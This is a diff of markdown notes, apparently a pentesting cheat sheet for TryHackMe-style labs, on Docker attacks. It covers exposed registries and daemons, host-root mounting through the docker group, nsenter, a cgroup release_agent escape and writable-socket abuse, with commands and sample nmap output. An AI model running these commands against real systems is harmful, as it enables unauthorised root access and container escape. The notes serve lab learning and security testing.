@@ -1,4 +1,4 @@
-##### Docker registries
+#### Docker registries
 A docker registry is a storage and distribution system for named Docker images. 
 The registry is organized into Docker repositories, with information about the current images.
 The default port is 5000.
@@ -11,7 +11,7 @@ curl http://IP:PORT/v2/REPOSITORY/NAME/tags/list       // Get tags of an image.
 curl http://IP:PORT/v2/REPOSITORY/NAME/manifests/TAG   // Get info of a tag (usually contains command history)
 ```
 
-##### Reverse engineering
+#### Reverse engineering
 If you're able to query the data inside of the docker registry (see [[#Docker registries]]), `docker pull` the registry:
 ```c++
 nano /etc/docker/daemon.json
@@ -24,18 +24,80 @@ docker info   // Check if the IP has been added to the insecure registries.
 ```
 try dumping the docker images with [[Dive]]
 
-##### Exposed docker daemon
+#### Exposed docker daemon
 If you find an exposed docker daemon (Nmap docker, with a lot of info), you can communicate with the image inside.
+
+Example `nmap` output:
+```
+┌─[root@edu-virtualbox]─[.../edu/THM]
+└──╼ #nmap -A -p2375 10.10.68.223
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-11 16:41 CET
+Nmap scan report for 10.10.68.223
+Host is up (0.044s latency).
+                                                           
+PORT     STATE SERVICE VERSION
+2375/tcp open  docker  Docker 20.10.20 (API 1.41)
+| docker-version:         
+|   BuildTime: 2022-10-18T18:18:12.000000000+00:00
+|   ApiVersion: 1.41                                    
+|   KernelVersion: 5.15.0-1022-aws
+|   Version: 20.10.20        
+|   Platform:                
+|     Name: Docker Engine - Community
+|   GitCommit: 03df974
+|   GoVersion: go1.18.7      
+|   Components: 
+|                       
+|       Name: Engine  
+|       Version: 20.10.20
+|       Details:                                                                                                       
+|         ApiVersion: 1.41
+|         KernelVersion: 5.15.0-1022-aws
+|         BuildTime: 2022-10-18T18:18:12.000000000+00:00
+|         GitCommit: 03df974
+|         GoVersion: go1.18.7         
+|         Experimental: false
+|         Arch: amd64    
+|         Os: linux    
+|         MinAPIVersion: 1.12
+|                           
+|       Name: containerd
+|       Version: 1.6.8
+|       Details:       
+|         GitCommit: 9cd3357b7fd7218e4aec3eae239db1f68a5a6ec6                                        
+|                                                                                                                                                                                                                                              |       Name: runc                               
+|       Version: 1.1.4                                   
+|       Details:        
+|         GitCommit: v1.1.4-0-g5fd4c4d
+|     
+|       Name: docker-init       
+|       Version: 0.19.0
+|       Details:     
+|         GitCommit: de40ad0
+|   Arch: amd64
+|   Os: linux                                                                                                          
+|_  MinAPIVersion: 1.12                                                                                                
+
+```
+
 To confirm access, use `curl http://IP:PORT/version`
+The default port is `2375`
+
 To execute code:
 ```
 docker -H tcp://IP:PORT ps                        // List running images
-docker -H tcp://IP:PORT exec CONTAINER_ID COMMAND // Execute a command in a container  
-use rootplease (haven't figured out yet)
+// Note: if there are no containers running, use the commands "images" to list, and "run", to run a container.
+docker -H tcp://IP:PORT exec CONTAINER_ID COMMAND // Execute a command in a container 
 ```
 
-##### Exposed internal docker daemon
+#### Exposed internal docker daemon
 Assuming you've got a foothold on the target system, check for the "Docker" group using `groups`
+##### Initial check:
+```
+user@machine:~#groups
+sudo docker                  // "docker" group is enabled
+```
+##### Exploitation
 ```
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh         // Mount the host system to the internal image
 // IMPORTANT NOTE: This won't work on THM servers, or other places without access to the internet.
@@ -53,10 +115,10 @@ nsenter --target 1 --mount sh
 `--mount`  -- the mount namespace of the target process
 `sh`  -- Execute `sh` in the namespace (kernel)
 
-##### Capabilities
+#### Capabilities
 Requirement: a Docker image with `privileged` mode enabled.
 The `priveleged` mode means that all capabilities have been granted to the Docker image, allowing it to bypass the Docker Engine and reach the system.
-To check if the image is Priveleged, use
+To check if the image is Privileged, use
 ```
 capsh --print                    // If this gives lots of output, privileged mode is likely enabled.
 capsh --print | grep sys_admin   // If this returns output, it is exploitable.
@@ -78,14 +140,14 @@ chmod a+x /cmd
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
-##### Writable docker socket
+#### Writable docker socket
 To get root in the docker, upload a docker binary.
 Secondly, run 
 ```
 ./docker run --entrypoint /bin/bash -it --rm HOST_IMAGE_NAME
 ```
 
-##### Scanning the host
+#### Scanning the host
 The host of the docker's IP is usually 172.17.0.1
 To make sure, use:
 ```
